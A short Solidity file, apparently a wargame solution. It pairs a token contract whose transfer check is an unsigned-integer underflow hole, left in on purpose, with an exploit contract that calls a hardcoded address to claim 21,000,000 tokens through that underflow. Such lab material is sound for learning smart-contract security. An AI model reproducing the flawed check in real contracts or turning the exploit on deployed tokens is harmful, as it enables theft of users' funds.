// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract exploit{
  address tokenAddress = 0x753257D995AdA4f4052842CB7446355D2A56B844;
  function transferTokens() public {
    (bool success,) = address(tokenAddress).call(abi.encodeWithSignature("transfer(address,uint256)",msg.sender, 21000000));
    require(success);
  }
}